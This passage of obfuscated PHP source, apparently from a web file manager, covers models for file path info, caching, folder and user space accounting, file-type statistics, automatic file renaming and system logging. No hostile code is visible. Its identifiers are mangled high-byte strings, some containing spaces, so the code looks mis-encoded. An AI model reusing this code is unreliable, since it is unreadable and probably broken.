(!$òê¡şÎõ) { return !1; } return IO::fileSubstr($òê¡şÎõ[$_SERVER[ï»»·÷á][84]], $ä’Ó¿Õˆ, $“ãÖÛÎˆ); } public function fileInfoGet($£ß„ô¡©) { $¤£ì¨ =& $_SERVER[ï»»·÷á]; $œÄæíÑ” = $this->sourceInfo($£ß„ô¡©); if (!$œÄæíÑ” || $œÄæíÑ”[$¤£ì¨[419]]) { return !1; } $ˆÄ›×¨’ = $¤£ì¨[483] . $œÄæíÑ”[$¤£ì¨[477]]; $Ş©ĞÍÜ = _get(self::$cacheFileInfo, $ˆÄ›×¨’); if ($Ş©ĞÍÜ) { return $Ş©ĞÍÜ; } $ íáÛ‡ = Model($¤£ì¨[480])->fileInfo($œÄæíÑ”[$¤£ì¨[477]]); if ($ íáÛ‡) { $ íáÛ‡[$¤£ì¨[32]] = $œÄæíÑ”[$¤£ì¨[32]]; } self::$cacheFileInfo[$ˆÄ›×¨’] = $ íáÛ‡; return $ íáÛ‡; } private function folderChildrenNumber($Ë¹Ÿ„¤¬) { $”ÕˆæØŞ =& $_SERVER[ï»»·÷á]; $’±ä±‹´ = $this->sourceInfo($Ë¹Ÿ„¤¬); $¹éŞ ‘Ÿ = array($”ÕˆæØŞ[589] => array($”ÕˆæØŞ[549], $’±ä±‹´[$”ÕˆæØŞ[520]] . $Ë¹Ÿ„¤¬ . $”ÕˆæØŞ[550]), $”ÕˆæØŞ[586] => $’±ä±‹´[$”ÕˆæØŞ[505]], $”ÕˆæØŞ[439] => intval($’±ä±‹´[$”ÕˆæØŞ[440]]), $”ÕˆæØŞ[583] => 1); $úµ™ƒú = $this->where($¹éŞ ‘Ÿ)->count(); $´€È€‡ü = $this->where($¹éŞ ‘Ÿ)->where(array($”ÕˆæØŞ[583] => 0))->count(); return array($”ÕˆæØŞ[80] => $´€È€‡ü, $”ÕˆæØŞ[81] => $úµ™ƒú); } public function pathInfo($°í¦Üâğ, $£»ÏÛóÕ = false) { $…ò’«çÈ =& $_SERVER[ï»»·÷á]; $£»ÏÛóÕ = !1; $°í¦Üâğ = intval($°í¦Üâğ); $³¸Í›Ú– = $…ò’«çÈ[470] . intval($£»ÏÛóÕ) . $…ò’«çÈ[386] . $°í¦Üâğ; $ ‹¿Åâ¢ = _get(self::$cachePathInfo, $³¸Í›Ú–); if ($ ‹¿Åâ¢) { return $ ‹¿Åâ¢; } $¸–Ï¥ù = $this->sourceInfo($°í¦Üâğ); if (!$¸–Ï¥ù) { return !1; } $¸–Ï¥ù = $this->_listDataApplyItem($¸–Ï¥ù, $£»ÏÛóÕ); self::$cachePathInfo[$³¸Í›Ú–] = $¸–Ï¥ù; return $¸–Ï¥ù; } public static $cachePathInfoMore = array(); public function pathInfoMore($ñ˜İ®¨ğ) { $¥™ë÷‹ =& $_SERVER[ï»»·÷á]; $ËÔ®¯Î» = _get(self::$cachePathInfoMore, $ñ˜İ®¨ğ); if ($ËÔ®¯Î») { return $ËÔ®¯Î»; } $¦Ã°¡ıÔ = $this->pathInfo($ñ˜İ®¨ğ); if (!$¦Ã°¡ıÔ) { return !1; } if ($¦Ã°¡ıÔ[$¥™ë÷‹[419]] == $¥™ë÷‹[88]) { $¦Ã°¡ıÔ[$¥™ë÷‹[79]] = $this->folderChildrenNumber($ñ˜İ®¨ğ); } self::$cachePathInfoMore[$ñ˜İ®¨ğ] = $¦Ã°¡ıÔ; return $¦Ã°¡ıÔ; } public function sourceInfo($ÉÆä™ÈÃ) { $Í¨ÚËà… =& $_SERVER[ï»»·÷á]; if (!$ÉÆä™ÈÃ) { return array(); } $ÉÆä™ÈÃ = intval($ÉÆä™ÈÃ); $ØÃ¨Øù² = $Í¨ÚËà…[469] . $ÉÆä™ÈÃ; $íÅ€˜Áº = _get(self::$cacheSourceInfo, $ØÃ¨Øù²); if ($íÅ€˜Áº) { return $íÅ€˜Áº; } $À§ßøû = $this->where(array($Í¨ÚËà…[411] => $ÉÆä™ÈÃ))->find(); self::$cacheSourceInfo[$ØÃ¨Øù²] = $À§ßøû; return self::$cacheSourceInfo[$ØÃ¨Øù²]; } public function sourceCacheClear($€ÒœŒÍç = false) { self::cacheClear($€ÒœŒÍç); } public static function cacheClear($İ°û•ñË = false) { $üŒŒÜ˜Ó =& $_SERVER[ï»»·÷á]; if ($İ°û•ñË == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$üŒŒÜ˜Ó[469] . $İ°û•ñË]); unset(self::$cachePathInfoMore[$İ°û•ñË]); unset(self::$cachePathInfo[$üŒŒÜ˜Ó[2169] . $İ°û•ñË]); unset(self::$cachePathInfo[$üŒŒÜ˜Ó[2170] . $İ°û•ñË]); } public function metaSet($õ®‘•—¯, $Éôİµ…¾ = null, $¹çœêı = null) { $÷æ‘››å = parent::metaSet($õ®‘•—¯, $Éôİµ…¾, $¹çœêı); if ($÷æ‘››å) { $this->sourceCacheClear($õ®‘•—¯); } return $÷æ‘››å; } public function pathInfoByPath($í¾Û¸Ì, $ìÒÑè¾Ë) { $ÙÀ¹¿†‘ =& $_SERVER[ï»»·÷á]; $Ô´ Ãş = !$ìÒÑè¾Ë ? array() : explode($ÙÀ¹¿†‘[8], trim($ìÒÑè¾Ë, $ÙÀ¹¿†‘[8])); $¤´ŒÅ» = $í¾Û¸Ì; foreach ($Ô´ Ãş as $íˆóÈÄ–) { $¾ç¾ğŸÒ = array($ÙÀ¹¿†‘[441] => $¤´ŒÅ», $ÙÀ¹¿†‘[32] => $íˆóÈÄ–); $„”Ô—ãä = $this->where($¾ç¾ğŸÒ)->select(); if (!$„”Ô—ãä) { return !1; } $„”Ô—ãä = array_sort_by($„”Ô—ãä, $ÙÀ¹¿†‘[440]); $¤´ŒÅ» = $„”Ô—ãä[0][$ÙÀ¹¿†‘[411]]; } return $this->pathInfo($¤´ŒÅ», !0); } protected function updateModifyTime($ŞÓ…Õ „) { $¹­†ÂÇÖ =& $_SERVER[ï»»·÷á]; if (!$ŞÓ…Õ „) { return; } if (!is_array($ŞÓ…Õ „)) { $ŞÓ…Õ „ = array($ŞÓ…Õ „); } foreach ($ŞÓ…Õ „ as $µãø‚ => $á‹Òú˜) { $ŞÓ…Õ „[$µãø‚] = intval($á‹Òú˜); $this->sourceCacheClear($á‹Òú˜); } $Ÿï Á§  = array($¹­†ÂÇÖ[411] => array($¹­†ÂÇÖ[7], $ŞÓ…Õ „)); $æşç¼ôŒ = array($¹­†ÂÇÖ[588] => USER_ID, $¹­†ÂÇÖ[433] => time()); $this->where($Ÿï Á§ )->save($æşç¼ôŒ); } public function folderSizeReset($¿©ğë¶¤, $ã÷ÏË»ú = false) { $°Õô• =& $_SERVER[ï»»·÷á]; if ($this->statusIgnoreResetSpace) { return; } $òÆÓ¡Ğñ = $this->sourceInfo($¿©ğë¶¤); $ĞÏ¼ˆ‚€ = $°Õô•[2171] . $¿©ğë¶¤; CacheLock::lock($ĞÏ¼ˆ‚€, 20); if ($ã÷ÏË»ú === !1) { $this->sourceCacheClear($¿©ğë¶¤); $òÆÓ¡Ğñ = $this->sourceInfo($¿©ğë¶¤); $·•ªµÆá = array($°Õô•[410] => $¿©ğë¶¤, $°Õô•[439] => 0); $™Û¬õÍÌ = $this->where($·•ªµÆá)->sum($°Õô•[76]); $ã÷ÏË»ú = intval($™Û¬õÍÌ) - intval($òÆÓ¡Ğñ[$°Õô•[76]]); } if ($ã÷ÏË»ú == 0) { return CacheLock::unlock($ĞÏ¼ˆ‚€); } $ÀüÀŞèº = $this->parentLevelArray($òÆÓ¡Ğñ[$°Õô•[520]]); if (!$ÀüÀŞèº) { $ÀüÀŞèº = array(); } $ÀüÀŞèº[] = $òÆÓ¡Ğñ[$°Õô•[411]]; $·•ªµÆá = array($°Õô•[411] => array($°Õô•[427], $ÀüÀŞèº)); if ($ã÷ÏË»ú < 0) { $·•ªµÆá[$°Õô•[76]] = array($°Õô•[1025], abs($ã÷ÏË»ú)); } $this->where($·•ªµÆá)->setAdd($°Õô•[76], $ã÷ÏË»ú); CacheLock::unlock($ĞÏ¼ˆ‚€); $—›˜¦»» = $°Õô•[2172] . $òÆÓ¡Ğñ[$°Õô•[420]] . $°Õô•[4] . $òÆÓ¡Ğñ[$°Õô•[505]]; $À€™´Ã = array($òÆÓ¡Ğñ[$°Õô•[420]], $òÆÓ¡Ğñ[$°Õô•[505]]); TaskRun::timeLimitCall($—›˜¦»», $°Õô•[2173], $À€™´Ã, 1.5); } public function folderSizeResetChildren($ßÛÊÄ´) { $†ƒíŠìË =& $_SERVER[ï»»·÷á]; $this->sourceCacheClear($ßÛÊÄ´); $¿˜ÑÑá© = $this->sourceInfo($ßÛÊÄ´); $ËıñŒß = array($†ƒíŠìË[583] => 1, $†ƒíŠìË[586] => $¿˜ÑÑá©[$†ƒíŠìË[505]], $†ƒíŠìË[589] => array($†ƒíŠìË[549], $¿˜ÑÑá©[$†ƒíŠìË[520]] . $ßÛÊÄ´ . $†ƒíŠìË[550])); $¬ƒ¨Ñ™­ = $†ƒíŠìË[2174]; $¸‘•â § = $this->field($¬ƒ¨Ñ™­)->where($ËıñŒß)->select(); $ËıñŒß[$†ƒíŠìË[419]] = 0; $ı®ê¾³ = $this->field($¬ƒ¨Ñ™­)->where($ËıñŒß)->select(); if (!$ı®ê¾³) { return; } $¸‘•â §[] = $¿˜ÑÑá©; $¸‘•â § = array_to_keyvalue($¸‘•â §, $†ƒíŠìË[411]); foreach ($¸‘•â § as $Ê™²°ëÉ => $×‘à‘ïÉ) { $¸‘•â §[$Ê™²°ëÉ][$†ƒíŠìË[2175]] = $¸‘•â §[$Ê™²°ëÉ][$†ƒíŠìË[76]]; $¸‘•â §[$Ê™²°ëÉ][$†ƒíŠìË[76]] = 0; } foreach ($ı®ê¾³ as $×‘à‘ïÉ) { $ˆÕÖ¥¦ = $×‘à‘ïÉ[$†ƒíŠìË[441]] . $†ƒíŠìË[12]; if (!isset($¸‘•â §[$ˆÕÖ¥¦])) { continue; } if ($×‘à‘ïÉ[$†ƒíŠìË[440]] == $¸‘•â §[$ˆÕÖ¥¦][$†ƒíŠìË[440]]) { $¸‘•â §[$ˆÕÖ¥¦][$†ƒíŠìË[76]] += $×‘à‘ïÉ[$†ƒíŠìË[76]]; } } foreach ($¸‘•â § as $×‘à‘ïÉ) { $Ü·™§Š = $this->parentLevelArray($×‘à‘ïÉ[$†ƒíŠìË[520]]); foreach ($Ü·™§Š as $ˆÕÖ¥¦) { $ˆÕÖ¥¦ = $ˆÕÖ¥¦ . $†ƒíŠìË[12]; if (!isset($¸‘•â §[$ˆÕÖ¥¦])) { continue; } if ($×‘à‘ïÉ[$†ƒíŠìË[440]] == $¸‘•â §[$ˆÕÖ¥¦][$†ƒíŠìË[440]]) { $¸‘•â §[$ˆÕÖ¥¦][$†ƒíŠìË[76]] += $×‘à‘ïÉ[$†ƒíŠìË[76]]; } } } $œÇéÊºİ = array(); foreach ($¸‘•â § as $×‘à‘ïÉ) { if ($×‘à‘ïÉ[$†ƒíŠìË[76]] == $×‘à‘ïÉ[$†ƒíŠìË[2175]]) { continue; } $œÇéÊºİ[] = array($†ƒíŠìË[411], $×‘à‘ïÉ[$†ƒíŠìË[411]], $†ƒíŠìË[76], $×‘à‘ïÉ[$†ƒíŠìË[76]]); } $this->saveAll($œÇéÊºİ); } public function userSpaceReset($àÃÖ°ã = false) { $÷·–³å =& $_SERVER[ï»»·÷á]; $ÇéÉä±Ö = $this->where(array($÷·–³å[420] => self::TYPE_USER, $÷·–³å[505] => $àÃÖ°ã, $÷·–³å[419] => 0))->sum($÷·–³å[76]); $ÇéÉä±Ö = !$ÇéÉä±Ö || $ÇéÉä±Ö <= 0 ? 0 : $ÇéÉä±Ö; Model($÷·–³å[513])->userEdit($àÃÖ°ã, array($÷·–³å[1856] => $ÇéÉä±Ö)); } public function targetSpaceUpdate($Óˆâ‰£ì, $ÛŒ–ßÛî) { $ÍÔÆ…»ù =& $_SERVER[ï»»·÷á]; if (!$ÛŒ–ßÛî) { return; } if (!in_array($Óˆâ‰£ì, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $’¢’Ññ… = $this->targetSpaceSize($Óˆâ‰£ì, $ÛŒ–ßÛî); if ($Óˆâ‰£ì == self::TYPE_USER) { Model($ÍÔÆ…»ù[513])->userEdit($ÛŒ–ßÛî, array($ÍÔÆ…»ù[1856] => $’¢’Ññ…)); } else { if ($Óˆâ‰£ì == self::TYPE_GROUP) { Model($ÍÔÆ…»ù[521])->groupEdit($ÛŒ–ßÛî, array($ÍÔÆ…»ù[1856] => $’¢’Ññ…)); } } } public function targetSpaceSize($¨ùÙœ¡á, $ÎÈñ×Ô„) { $ôÍñ×úê =& $_SERVER[ï»»·÷á]; $àš£ê‹„ = 0; $¬ì¡Šˆ = $this->targetSourceRoot($¨ùÙœ¡á, $ÎÈñ×Ô„, !0); foreach ($¬ì¡Šˆ as $´õØİ”é) { if (!$´õØİ”é) { continue; } $àš£ê‹„ += floatval($´õØİ”é[$ôÍñ×úê[76]]); $õŞ«¨ = array($ôÍñ×úê[589] => array($ôÍñ×úê[549], $ôÍñ×úê[530] . $´õØİ”é[$ôÍñ×úê[411]] . $ôÍñ×úê[550])); $®ëÓ’ÀÇ = Model($ôÍñ×úê[438])->field($ôÍñ×úê[426])->where($õŞ«¨)->select(); $®ëÓ’ÀÇ = array_to_keyvalue($®ëÓ’ÀÇ, $ôÍñ×úê[12], $ôÍñ×úê[411]); $®ëÓ’ÀÇ = array_unique(array_filter($®ëÓ’ÀÇ)); if ($®ëÓ’ÀÇ) { $õŞ«¨ = array($ôÍñ×úê[426] => array($ôÍñ×úê[427], $®ëÓ’ÀÇ)); $àš£ê‹„ += floatval($this->where($õŞ«¨)->sum($ôÍñ×úê[76])); } } $àš£ê‹„ = !$àš£ê‹„ || $àš£ê‹„ <= 0 ? 0 : $àš£ê‹„; return $àš£ê‹„; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($¥è©»Ó†) { return $this->fileTypeProfile($¥è©»Ó†, SourceModel::TYPE_USER); } public function groupFileTypeProfile($İàÈè) { return $this->fileTypeProfile($İàÈè, SourceModel::TYPE_GROUP); } private function fileTypeProfile($¯£¢õ°Á, $©­ï†’Î) { $Ç˜€£§ù =& $_SERVER[ï»»·÷á]; $“şæ¤î¡ = $Ç˜€£§ù[2176] . $¯£¢õ°Á . $Ç˜€£§ù[11] . $©­ï†’Î; $’Öé×– = Cache::get($“şæ¤î¡); if ($’Öé×–) { return $’Öé×–; } $§öê§Ì = array($Ç˜€£§ù[583] => 0); if ($¯£¢õ°Á != !1) { $§öê§Ì[$Ç˜€£§ù[505]] = $¯£¢õ°Á; $§öê§Ì[$Ç˜€£§ù[420]] = $©­ï†’Î; } $ó…Å”¢Ü = array(); $ó…Å”¢Ü[$Ç˜€£§ù[2177]] = array($Ç˜€£§ù[2178] => LNG($Ç˜€£§ù[2177]), $Ç˜€£§ù[2179] => $this->where($§öê§Ì)->count(), $Ç˜€£§ù[554] => $this->where($§öê§Ì)->sum($Ç˜€£§ù[76])); $Äğ£†Ô = KodIO::fileTypeList(); foreach ($Äğ£†Ô as $”²¿„–” => $·¤ú¢÷Ø) { $§öê§Ì[$Ç˜€£§ù[421]] = $this->fileTypeWhere($”²¿„–”); $ó…Å”¢Ü[$”²¿„–”] = array($Ç˜€£§ù[2178] => $·¤ú¢÷Ø[$Ç˜€£§ù[32]], $Ç˜€£§ù[2179] => $this->where($§öê§Ì)->count(), $Ç˜€£§ù[554] => $this->where($§öê§Ì)->sum($Ç˜€£§ù[76])); } Cache::set($“şæ¤î¡, $ó…Å”¢Ü, 1200); return $ó…Å”¢Ü; } public function fileNameExist($Ö ®ÕÊÁ, $¯ºŸ³¾²) { $Ø„“¦ûø =& $_SERVER[ï»»·÷á]; $ÌÍ¬­šó = $this->where(array($Ø„“¦ûø[441] => $Ö ®ÕÊÁ, $Ø„“¦ûø[32] => $¯ºŸ³¾², $Ø„“¦ûø[440] => 0))->find(); return is_array($ÌÍ¬­šó) ? $ÌÍ¬­šó[$Ø„“¦ûø[411]] : !1; } public function childList($¹ß’¥ç€) { $«æ¬ÙìÍ =& $_SERVER[ï»»·÷á]; $Ú´½¸òµ = $«æ¬ÙìÍ[2154] . $¹ß’¥ç€; if (isset(self::$cacheChildList[$Ú´½¸òµ])) { return self::$cacheChildList[$Ú´½¸òµ]; } $Ğ’ë = array($«æ¬ÙìÍ[441] => intval($¹ß’¥ç€), $«æ¬ÙìÍ[440] => 0); $ü•ëŸèä = $this->where($Ğ’ë)->select(); $ü•ëŸèä = $ü•ëŸèä ? $ü•ëŸèä : array(); self::$cacheChildList[$Ú´½¸òµ] = $ü•ëŸèä; foreach ($ü•ëŸèä as $Øœ½³Êì) { $Ú´½¸òµ = $«æ¬ÙìÍ[469] . $Øœ½³Êì[$«æ¬ÙìÍ[411]]; self::$cacheSourceInfo[$Ú´½¸òµ] = $Øœ½³Êì; } return $ü•ëŸèä; } public function fileNameAuto($°ˆÅî¨, $‹øÛªÁ, $²ñ›¶ù® = REPEAT_RENAME, $çÀËÌÉÍ = false) { $‘‡õ†öˆ =& $_SERVER[ï»»·÷á]; $ÂÁÄüüª = get_path_ext($‹øÛªÁ); $õè¶ñÀà = $ÂÁÄüüª ? basename($‹øÛªÁ, $‘‡õ†öˆ[10] . $ÂÁÄüüª) . $‘‡õ†öˆ[2180] . $ÂÁÄüüª : $‹øÛªÁ . $‘‡õ†öˆ[384]; $”°Ú–³ı = array($‘‡õ†öˆ[441] => $°ˆÅî¨, $‘‡õ†öˆ[440] => 0, $‘‡õ†öˆ[32] => array($‘‡õ†öˆ[383], $õè¶ñÀà)); $Œèß§¨û = $this->field($‘‡õ†öˆ[32])->where($”°Ú–³ı)->select(); $‹æÜÛÄú = array_to_keyvalue($Œèß§¨û, $‘‡õ†öˆ[12], $‘‡õ†öˆ[32]); return $this->fileNameAutoGet($‹æÜÛÄú, $‹øÛªÁ, $²ñ›¶ù®, $çÀËÌÉÍ); } public function fileNameAutoGet($Öú„˜Ôš, $úÛÑšâŒ, $Ë¦¦‡í, $£î™Øè) { $ĞøÙœÎ¤ =& $_SERVER[ï»»·÷á]; if ($Ë¦¦‡í == REPEAT_REPLACE || !$Öú„˜Ôš || !in_array_not_case($úÛÑšâŒ, $Öú„˜Ôš) || $£î™Øè && $Ë¦¦‡í != REPEAT_RENAME_FOLDER) { return $úÛÑšâŒ; } if ($Ë¦¦‡í == REPEAT_SKIP) { return !1; } $¹Àû€æ = $ĞøÙœÎ¤[10] . get_path_ext($úÛÑšâŒ); $¹Àû€æ = $¹Àû€æ == $ĞøÙœÎ¤[10] || $£î™Øè ? $ĞøÙœÎ¤[12] : $¹Àû€æ; for ($ô¿¢â¦è = 1; $ô¿¢â¦è <= count($Öú„˜Ôš) + 1; $ô¿¢â¦è++) { $¼Ü™´ä = substr($úÛÑšâŒ, 0, strlen($úÛÑšâŒ) - strlen($¹Àû€æ)); $ûÁ§ñÀã = $¼Ü™´ä . "\x28{$ô¿¢â¦è}\x29{$¹Àû€æ}"; if (!in_array_not_case($ûÁ§ñÀã, $Öú„˜Ôš)) { return $ûÁ§ñÀã; } } } } goto d±”ì¼À‹¶; FÈÕ·¼Øõê: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\155\56\114\x69\x67\x68\164\x41\160\x70"; public $modelType = "\x53\171\163\x74\145\155\x4f\160\164\x69\157\156"; public $field = array("\x6e\141\155\x65", "\x67\162\x6f\x75\160", "\144\x65\x73\143", "\143\157\156\164\145\x6e\x74"); public function listData($Æùì’Æø = false, $µİÒ†Ú´ = "\x6d\x6f\144\151\x66\171\x54\151\x6d\145", $¿ÙáªÇğ = true) { return parent::listData($Æùì’Æø, $µİÒ†Ú´, $¿ÙáªÇğ); } public function remove($¦¦ì©â) { $ÀÜîàó  = $this->findByName($¦¦ì©â); if (!$ÀÜîàó ) { return !1; } return parent::remove($ÀÜîàó [$_SERVER[ï»»·÷á][399]]); } public function add($ù»ƒ°´) { if ($this->findByName($ù»ƒ°´[$_SERVER[ï»»·÷á][32]])) { return !1; } return parent::insert($ù»ƒ°´); } public function update($ÙèûşØ•, $Û‹–‰—¢) { $¡¼¸ÍÅÚ =& $_SERVER[ï»»·÷á]; $Ë ÌïÇ÷ = $this->findByName($ÙèûşØ•); $¾Âó¬À¨ = $this->findByName($Û‹–‰—¢[$¡¼¸ÍÅÚ[32]]); if (!$Ë ÌïÇ÷ || $¾Âó¬À¨ && $¾Âó¬À¨[$¡¼¸ÍÅÚ[399]] != $Ë ÌïÇ÷[$¡¼¸ÍÅÚ[399]]) { return !1; } return parent::update($Ë ÌïÇ÷[$¡¼¸ÍÅÚ[399]], $Û‹–‰—¢); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\x73\x74\145\155\x5f\154\157\x67"; protected $dataAuto = array(array("\143\x72\x65\141\x74\x65\124\151\x6d\x65", "\x74\x69\x6d\145", "\x69\156\163\x65\162\164", "\x66\165\x6e\x63\164\151\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $”Æë­î =& $_SERVER[ï»»·÷á]; return array($”Æë­î[2200] => LNG($”Æë­î[2201]), $”Æë­î[2202] => LNG($”Æë­î[2203]), $”Æë­î[1810] => LNG($”Æë­î[2204]), $”Æë­î[2205] => LNG($”Æë­î[2206]), $”Æë­î[2207] => LNG($”Æë­î[2208]), $”Æë­î[2209] => LNG($”Æë­î[2210]), $”Æë­î[2211] => LNG($”Æë­î[2212]), $”Æë­î[1840] => LNG($”Æë­î[2212]), $”Æë­î[1841] => LNG($”Æë­î[2213]), $”Æë­î[2214] => LNG($”Æë­î[2215]), $”Æë­î[2216] => LNG($”Æë­î[2217]), $”Æë­î[2218] => LNG($”Æë­î[2219]), $”Æë­î[2220] => LNG($”Æë­î[2221]), $”Æë­î[1838] => LNG($”Æë­î[2222]), $”Æë­î[2223] => LNG($”Æë­î[2224]), $”Æë­î[1845] => LNG($”Æë­î[2225]), $”Æë­î[2226] => LNG($”Æë­î[2227]), $”Æë­î[2228] => LNG($”Æë­î[2229]), $”Æë­î[2230] => LNG($”Æë­î[2231]), $”Æë­î[2232] => LNG($”Æë­î[2233]), $”Æë­î[1848] => LNG($”Æë­î[2234]), $”Æë­î[1849] => LNG($”Æë­î[2235]), $”Æë­î[2236] => LNG($”Æë­î[2237]), $”Æë­î[2238] => LNG($”Æë­î[2239]), $”Æë­î[2240] => LNG($”Æë­î[2241]), $”Æë­î[1843] => LNG($”Æë­î[2242]), $”Æë­î[2243] => LNG($”Æë­î[2244]), $”Æë­î[1842] => LNG($”Æë­î[2245]), $”Æë­î[2246] => LNG($”Æë­î[2247]), $”Æë­î[2248] => LNG($”Æë­î[2249]), $”Æë­î[2250] => LNG($”Æë­î[2251]), $”Æë­î[2252] => LNG($”Æë­î[2252]), $”Æë­î[2253] => LNG($”Æë­î[1814]), $”Æë­î[2254] => LNG($”Æë­î[2255]), $”Æë­î[2256] => LNG($”Æë­î[2257]), $”Æë­î[2258] => LNG($”Æë­î[2259]), $”Æë­î[2260] => LNG($”Æë­î[2261]), $”Æë­î[2262] => LNG($”Æë­î[2263]), $”Æë­î[2264] => LNG($”Æë­î[2264]), $”Æë­î[2265] => LNG($”Æë­î[2266]), $”Æë­î[2267] => LNG($”Æë­î[2268]), $”Æë­î[2269] => LNG($”Æë­î[2270]), $”Æë­î[2271] => LNG($”Æë­î[2272]), $”Æë­î[2273] => LNG($”Æë­î[2274]), $”Æë­î[2275] => LNG($”Æë­î[2276])); } private function typeFile() { $­Š¶‰ı =& $_SERVER[ï»»·÷á]; $ŠéÇš«Š = array($­Š¶‰ı[1845] => array($­Š¶‰ı[1846]), $­Š¶‰ı[2218] => array($­Š¶‰ı[2277]), $­Š¶‰ı[2220] => array($­Š¶‰ı[2278]), $­Š¶‰ı[1838] => array($­Š¶‰ı[1839]), $­Š¶‰ı[2228] => array(), $­Š¶‰ı[2230] => array(), $­Š¶‰ı[2232] => array(), $­Š¶‰ı[1848] => array($­Š¶‰ı[1850]), $­Š¶‰ı[1849] => array($­Š¶‰ı[1850]), $­Š¶‰ı[2236] => array($­Š¶‰ı[2279]), $­Š¶‰ı[2238] => array($­Š¶‰ı[2279]), $­Š¶‰ı[2240] => array($­Š¶‰ı[2280]), $­Š¶‰ı[2226] => array($­Š¶‰ı[2281]), $­Š¶‰ı[1843] => array($­Š¶‰ı[2282]), $­Š¶‰ı[2243] => array($­Š¶‰ı[2283]), $­Š¶‰ı[1842] => array($­Š¶‰ı[1844])); return $ŠéÇš«Š; } private function typeAll() { $ñ”‰ =& $_SERVER[ï»»·÷á]; $†›¶•¤• = $this->typeList; $ü–È«åÔ = array_filter($this->typeFile()); foreach ($ü–È«åÔ as $œàÈ¢¢‚ => $®³ÎËÜÃ) { $†›¶•¤•[$®³ÎËÜÃ[0]] = $†›¶•¤•[$œàÈ¢¢‚]; } $†›¶•¤•[$ñ”‰[1850]] = LNG($ñ”‰[2284]); $†›¶•¤•[$ñ”‰[2279]] = LNG($ñ”‰[2285]); return $†›¶•¤•; } public function addLog($ÆÅ¬à¦Á, $¿˜äÃÉõ = array()) { $‹Ê¥ê¹ù =& $_SERVER[ï»»·÷á]; if (!isset($this->typeList[$ÆÅ¬à¦Á])) { return; } $Èİ¿Û†Í = USER_ID ? USER_ID : (isset($¿˜äÃÉõ[$‹Ê¥ê¹ù[1678]]) ? $¿˜äÃÉõ[$‹Ê¥ê¹ù[1678]] : 0); if (!$Èİ¿Û†Í) { $Èİ¿Û†Í = (int) Session::get($‹Ê¥ê¹ù[2004]); } if ($ÆÅ¬à¦Á == $‹Ê¥ê¹ù[2254] && is_array($¿˜äÃÉõ[$‹Ê¥ê¹ù[2286]]) && !$¿˜äÃÉõ[$‹Ê¥ê¹ù[2286]]) { return; } $Ü‹º¯üÜ = get_client_ip(); if (!$¿˜äÃÉõ || strlen(json_encode($¿˜äÃÉõ)) >= 1024) { $¿˜äÃÉõ = array($‹Ê¥ê¹ù[2287] => $Ü‹º¯üÜ); } else { if (is_array($¿˜äÃÉõ)) { $¿˜äÃÉõ[$‹Ê¥ê¹ù[2287]] = $Ü‹º¯üÜ; } else { $¿˜äÃÉõ = array($‹Ê¥ê¹ù[1212] => $¿˜äÃÉõ, $‹Ê¥ê¹ù[2287] => $Ü‹º¯üÜ); } } $¿˜äÃÉõ = array($‹Ê¥ê¹ù[1668] => Session::sign(), $‹Ê¥ê¹ù[1669] => $Èİ¿Û†Í, $‹Ê¥ê¹ù[33] => $ÆÅ¬à¦Á, $‹Ê¥ê¹ù[1671] => json_encode($¿˜äÃÉõ)); parent::add($¿˜äÃÉõ); } public function remove($™ÁØÇÁ‡) { $this->where(array($_SERVER[ï»»·÷á][428] => $™ÁØÇÁ‡))->delete(); } private function _makeOrder($Ğ°ª¨ˆ = '') { $ñá¾®˜º =& $_SERVER[ï»»·÷á]; $ÇÌß¿³ = $ñá¾®˜º[201]; $À”Æü = array($ñá¾®˜º[459] => $ñá¾®˜º[460], $ñá¾®˜º[461] => $ñá¾®˜º[462]); $¢ê¦ö¹Ô = Input::get($ñá¾®˜º[467], $ñá¾®˜º[7], $ñá¾®˜º[2040], array($ñá¾®˜º[1958], $ñá¾®˜º[461])); $¢ê¦ö¹Ô = $À”Æü[$¢ê¦ö¹Ô]; $Ğ°ª¨ˆ = $Ğ°ª¨ˆ . "{$ÇÌß¿³}\40{$¢ê¦ö¹Ô}"; return $this->order($Ğ°ª¨ˆ); } public function get($ƒŸ®Ù»Ş = '') { $‰²ÖÅªö =& $_SERVER[ï»»·÷á]; if (!$ƒŸ®Ù»Ş) { show_json(array()); } $ŒŒƒÁ½‚ = array(); if ($ƒŸ®Ù»Ş[$‰²ÖÅªö[1678]]) { $ŒŒƒÁ½‚[$‰²ÖÅªö[1678]] = $ƒŸ®Ù»Ş[$‰²ÖÅªö[1678]]; } if (isset($ƒŸ®Ù»Ş[$‰²ÖÅªö[773]])) { $ß³’¬ë‹ = $ƒŸ®Ù»Ş[$‰²ÖÅªö[773]]; $²¹œÈ×¿ = isset($ƒŸ®Ù»Ş[$‰²ÖÅªö[774]]) ? $ƒŸ®Ù»Ş[$‰²ÖÅªö[774]] : time(); $ŒŒƒÁ½‚[$‰²ÖÅªö[201]] = array($‰²ÖÅªö[333], array($ß³’¬ë‹, $²¹œÈ×¿)); } if ($ƒŸ®Ù»Ş[$‰²ÖÅªö[33]]) { $Œ­À‚§‘ = explode($‰²ÖÅªö[50], $ƒŸ®Ù»Ş[$‰²ÖÅªö[33]]); $´¯Ï¶­Ç = $this->typeFile(); $¾é³ìĞñ = array(); foreach ($Œ­À‚§‘ as $í¶–Õü¹) { $¾é³ìĞñ[] = $í¶–Õü¹; if (isset($´¯Ï¶­Ç[$í¶–Õü¹])) { $¾é³ìĞñ = array_merge($¾é³ìĞñ, $´¯Ï¶­Ç[$í¶–Õü¹]); } } $¾é³ìĞñ = array_unique($¾é³ìĞñ); if ($¾é³ìĞñ) { $ŒŒƒÁ½‚[$‰²ÖÅªö[33]] = array($‰²ÖÅªö[7], $¾é³ìĞñ); } } else { $ŒŒƒÁ½‚[$‰²ÖÅªö[33]] = array($‰²ÖÅªö[2288], $‰²ÖÅªö[2289]); } if (!empty($ƒŸ®Ù»Ş[$‰²ÖÅªö[2287]])) { $ŒŒƒÁ½‚[$‰²ÖÅªö[462]] = array($‰²ÖÅªö[383], 